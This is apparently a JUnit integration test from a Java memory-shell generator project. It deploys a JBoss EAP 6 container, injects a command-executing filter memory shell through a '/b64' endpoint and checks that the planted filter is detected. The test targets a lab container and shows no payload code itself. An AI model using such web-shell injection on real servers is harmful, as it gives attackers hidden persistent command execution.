package com.reajason.javaweb.integration.probe.jbosseap;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.integration.ProbeAssertion;
import com.reajason.javaweb.integration.VulTool;
import com.reajason.javaweb.integration.probe.AbstractProbeContainerTest;
import com.reajason.javaweb.integration.probe.ProbeTestConfig;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.payload.FilterProbeFactory;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.util.List;

import static com.reajason.javaweb.integration.ShellAssertion.shellInjectIsOk;
import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
@Testcontainers
public class JbossEap6ContainerTest extends AbstractProbeContainerTest {

    private static final ProbeTestConfig CONFIG = ProbeTestConfig.jboss(
                    "reajason/jboss:eap-6-jdk8",
                    "/usr/local/jboss/standalone/deployments/app.war")
            .expectedJdkVersion("JDK|1.8.0_342|52")
            .targetJdkVersion(Opcodes.V1_6)
            .build();

    @Container
    public static final GenericContainer<?> container = buildContainer(CONFIG);

    @Override
    protected ProbeTestConfig getConfig() {
        return CONFIG;
    }

    @Override
    protected GenericContainer<?> getContainer() {
        return container;
    }

    @Test
    protected void testFilterFirstInject() {
        String url = getUrl();
        MemShellResult memShellResult = shellInjectIsOk(
                url,
                getConfig().getServer(),
                ShellType.FILTER,
                ShellTool.Command,
                Opcodes.V1_6,
                Packers.BigInteger,
                getContainer());

        String data = VulTool.post(url + "/b64", FilterProbeFactory.getBase64ByServer(Server.Tomcat));
        List<String> filter = ProbeAssertion.getFiltersForContext(data, "/app");
        String filterName = ProbeAssertion.extractFilterName(filter.get(0));
        assertEquals(filterName, memShellResult.getShellClassName());
    }
}
